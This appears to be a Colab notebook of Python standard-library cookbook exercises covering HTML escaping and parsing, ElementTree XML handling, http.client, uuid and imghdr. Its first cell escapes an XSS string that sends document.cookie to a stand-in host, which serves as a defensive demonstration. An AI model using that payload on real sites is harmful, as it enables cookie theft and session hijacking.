{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyPrwey0PWZ60VbdCln2snBz",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/choi-day/Python-Library-Cookbook/blob/main/pylib_009.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "082"
      ],
      "metadata": {
        "id": "P9s4RVc4BHqM"
      }
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "mS3ZA7i8-24I",
        "outputId": "649d4bff-38e6-4729-e914-48ad2d28e85f"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "&lt;script&gt;location.href=&quot;http://hack.er/Cookie.php?cookie=&quot;+document.cookie&lt;/script&gt;\n"
          ]
        }
      ],
      "source": [
        "import html\n",
        "\n",
        "src = '<script>location.href=\"http://hack.er/Cookie.php?cookie=\"+document.cookie</script>'\n",
        "result = html.escape(src)\n",
        "print(result)"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "083"
      ],
      "metadata": {
        "id": "3r1YdL0vBG2G"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from html.parser import HTMLParser\n",
        "\n",
        "\n",
        "class MyHTMLParser(HTMLParser):\n",
        "    def __init__(self):\n",
        "        HTMLParser.__init__(self)\n",
        "        self.is_strong = False\n",
        "\n",
        "    def handle_starttag(self, tag, attrs):\n",
        "        if tag == 'strong': \n",
        "            self.is_strong = True\n",
        "\n",
        "    def handle_endtag(self, tag):\n",
        "        if tag == 'strong': \n",
        "            self.is_strong = False\n",
        "\n",
        "    def handle_data(self, data):\n",
        "        if self.is_strong:\n",
        "            print(data)    \n",
        "\n",
        "\n",
        "with open('python_zen.html') as f:\n",
        "    parser = MyHTMLParser()\n",
        "    parser.feed(f.read())"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "iFr4JeYwBfj0",
        "outputId": "453d83d8-2c99-4846-8845-5b309038774d"
      },
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "practicality\n",
            "never\n",
            "Now\n",
            "right\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "084"
      ],
      "metadata": {
        "id": "fdHmfQvfFgdw"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from xml.etree.ElementTree import Element, dump\n",
        "\n",
        "note = Element(\"note\")\n",
        "to = Element(\"to\")\n",
        "to.text = \"Tove\"\n",
        "\n",
        "from_ = Element(\"form\")\n",
        "from_.text = \"Jeney\"\n",
        "\n",
        "note.append(to)\n",
        "note.append(from_)\n",
        "dump(note)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "lLHOnjZODq1U",
        "outputId": "5a7d5a5a-5c09-4439-cdd1-a0ca6ebbd6a0"
      },
      "execution_count": 6,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "<note><to>Tove</to><form>Jeney</form></note>\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from xml.etree.ElementTree import Element, SubElement, dump\n",
        "\n",
        "note = Element(\"note\")\n",
        "to = Element(\"to\")\n",
        "to.text = \"Tove\"\n",
        "\n",
        "note.append(to)\n",
        "SubElement(note, \"from\").text = \"Jani\"\n",
        "\n",
        "dump(note)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "nBO6gVJBFhwx",
        "outputId": "4d539509-5a64-4332-fb3c-81d1e6ca6ffe"
      },
      "execution_count": 7,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "<note><to>Tove</to><from>Jani</from></note>\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from xml.etree.ElementTree import Element, SubElement, dump\n",
        "\n",
        "note = Element(\"note\")\n",
        "note.attrib['date'] = '20230530'\n",
        "\n",
        "to = Element(\"to\")\n",
        "to.text = \"Tove\"\n",
        "\n",
        "note.append(to)\n",
        "SubElement(note, \"from\").text = \"Jani\"\n",
        "\n",
        "dump(note)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "KuDjA76jGRGR",
        "outputId": "17f69532-2f77-4642-a950-6cf155ea8352"
      },
      "execution_count": 9,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "<note date=\"20230530\"><to>Tove</to><from>Jani</from></note>\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from xml.etree.ElementTree import Element, SubElement, dump\n",
        "from xml.dom import minidom\n",
        "\n",
        "note = Element(\"note\")\n",
        "note.attrib['date'] = '20230530'\n",
        "\n",
        "to = Element(\"to\")\n",
        "to.text = \"Tove\"\n",
        "\n",
        "note.append(to)\n",
        "SubElement(note, \"from\").text = \"Jani\"\n",
        "SubElement(note, \"from\").text = \"hong\"\n",
        "\n",
        "import xml.etree.ElementTree as ET\n",
        "xmlstr = minidom.parseString(ET.tostring(note)).toprettyxml(indent=\"  \")\n",
        "print(xmlstr)\n",
        "\n",
        "with open('note.xml', 'w') as f:\n",
        "    f.write(xmlstr)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "-Rlb42zrG50B",
        "outputId": "4cfb87f9-3721-407c-dd12-f882ed3c4af8"
      },
      "execution_count": 24,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "<?xml version=\"1.0\" ?>\n",
            "<note date=\"20230530\">\n",
            "  <to>Tove</to>\n",
            "  <from>Jani</from>\n",
            "  <from>hong</from>\n",
            "</note>\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "085"
      ],
      "metadata": {
        "id": "F24pYw14Ilni"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import xml.etree.ElementTree as ET\n",
        "\n",
        "tree = ET.parse('note.xml')\n",
        "\n",
        "note = tree.getroot()"
      ],
      "metadata": {
        "id": "MxN-ruoLJBOy"
      },
      "execution_count": 30,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "print(note)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "HSgQO0NcJU1A",
        "outputId": "d8334315-c9cf-45b9-94d9-e21488d1371a"
      },
      "execution_count": 31,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "<Element 'note' at 0x7f7d9d30bce0>\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "note.get(\"date\", \"1991231\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 35
        },
        "id": "l64skAWyJWJw",
        "outputId": "f7b97ea6-45ed-4fd3-a204-f43ee96ceea9"
      },
      "execution_count": 32,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'20230530'"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            }
          },
          "metadata": {},
          "execution_count": 32
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "note.keys()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "OYvfN76sJepg",
        "outputId": "9f86e9eb-1fb4-4ea3-cfa1-5f4d1de81b07"
      },
      "execution_count": 33,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['date']"
            ]
          },
          "metadata": {},
          "execution_count": 33
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "note.items()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ziABzY-nJsFf",
        "outputId": "d7b2030b-0f93-4272-c2a5-0d625383950d"
      },
      "execution_count": 20,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "[('date', '20230530')]"
            ]
          },
          "metadata": {},
          "execution_count": 20
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "note.find('from')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "8LTN5_InKBQA",
        "outputId": "8bbdfbc0-a461-4ff8-efc0-232bb0801b16"
      },
      "execution_count": 27,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<Element 'from' at 0x7f7d9d299620>"
            ]
          },
          "metadata": {},
          "execution_count": 27
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "note.findall('from')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "5Mqi__3TK0_Q",
        "outputId": "7fa4ee04-f5c1-4b19-a05f-808b44c03ad1"
      },
      "execution_count": 25,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "[<Element 'from' at 0x7f7d9d299620>, <Element 'from' at 0x7f7d9d299670>]"
            ]
          },
          "metadata": {},
          "execution_count": 25
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "note.findtext('from')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 35
        },
        "id": "4ugFGE2cK4Yf",
        "outputId": "759dd770-aed3-4d63-c8ca-788a65c36360"
      },
      "execution_count": 26,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'Jani'"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            }
          },
          "metadata": {},
          "execution_count": 26
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "childs = note.iter()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "gZKomhsNK8Cv",
        "outputId": "75116653-db90-4ef3-cdeb-171b82227bf1"
      },
      "execution_count": 28,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<_elementtree._element_iterator at 0x7f7d9d2f1d00>"
            ]
          },
          "metadata": {},
          "execution_count": 28
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "for child in note.iter():\n",
        "    print(child)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "pNjbCy3hLKWv",
        "outputId": "4dc9d2bd-d279-4aeb-b794-acc002cce2cc"
      },
      "execution_count": 29,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "<Element 'note' at 0x7f7d9d3dd760>\n",
            "<Element 'to' at 0x7f7d9d369580>\n",
            "<Element 'from' at 0x7f7d9d299620>\n",
            "<Element 'from' at 0x7f7d9d299670>\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "note.iter('from')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "qqWXuXKeLWkw",
        "outputId": "65f58686-d6ea-4782-8a29-168643b02231"
      },
      "execution_count": 34,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<_elementtree._element_iterator at 0x7f7dceb46020>"
            ]
          },
          "metadata": {},
          "execution_count": 34
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import xml.etree.ElementTree as ET\n",
        "\n",
        "tree = ET.parse('note.xml')\n",
        "\n",
        "note = tree.getroot()\n",
        "print(note.get(\"date\"))\n",
        "\n",
        "for parent in tree.iter():\n",
        "    for child in parent:\n",
        "        print(child.text)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "W1-XEmGZL1TK",
        "outputId": "d1a1c89b-073d-4c72-9780-3c98e8091026"
      },
      "execution_count": 35,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "20230530\n",
            "Tove\n",
            "Jani\n",
            "hong\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "091"
      ],
      "metadata": {
        "id": "eil7VnjQMWez"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import http.client\n",
        "\n",
        "\n",
        "conn = http.client.HTTPSConnection(\"wikidocs.net\")\n",
        "conn.request(\"GET\", \"/12\")\n",
        "r = conn.getresponse()\n",
        "print(r.status, r.reason)\n",
        "conn.close()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "09dHzOv5TYLs",
        "outputId": "2df1f1e8-e776-480e-9dc7-6c0f7e641285"
      },
      "execution_count": 38,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "200 OK\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import http.client\n",
        "\n",
        "\n",
        "def get_wikidocs(page):\n",
        "    conn = http.client.HTTPSConnection(\"wikidocs.net\")\n",
        "    conn.request(\"GET\", \"/12\")\n",
        "    r = conn.getresponse()\n",
        "    with open('wikidocs_%s.html' % page, 'wb') as f:\n",
        "        f.write(r.read())\n",
        "    conn.close()\n",
        "\n",
        "\n",
        "get_wikidocs(1)"
      ],
      "metadata": {
        "id": "Wmq9ciivULUc"
      },
      "execution_count": 41,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "098"
      ],
      "metadata": {
        "id": "iZW9FaW8UcPL"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import uuid\n",
        "\n",
        "a = uuid.uuid1()"
      ],
      "metadata": {
        "id": "TP_avUDVWJjb"
      },
      "execution_count": 42,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "a"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "b_Y_UpK-WNiN",
        "outputId": "b61e03e4-b72b-4d23-8c18-8f17c7d5ed31"
      },
      "execution_count": 43,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "UUID('367c253a-fe8c-11ed-b4cc-0242ac1c000c')"
            ]
          },
          "metadata": {},
          "execution_count": 43
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "102"
      ],
      "metadata": {
        "id": "RD3bjLZZWO0K"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import imghdr\n",
        "\n",
        "imghdr.what('logo.png')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 35
        },
        "id": "ZzpiTR2WXnMZ",
        "outputId": "ca0c0f0a-3ed0-44fc-998d-935c72be9680"
      },
      "execution_count": 45,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'png'"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            }
          },
          "metadata": {},
          "execution_count": 45
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "imghdr.what('test.jpg')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 35
        },
        "id": "lNnj9UqeX9J7",
        "outputId": "ff4b191f-f71f-44a2-c237-2261d62af5b5"
      },
      "execution_count": 47,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'jpeg'"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            }
          },
          "metadata": {},
          "execution_count": 47
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import os\n",
        "\n",
        "for filename in os.listdir():\n",
        "    if not os.path.isdir(filename):\n",
        "        img_type = imghdr.what(filename)\n",
        "        if img_type:\n",
        "            os.rename(filename, filename+ '.' + img_type)"
      ],
      "metadata": {
        "id": "KAa37YjIYAWK"
      },
      "execution_count": 48,
      "outputs": []
    }
  ]
}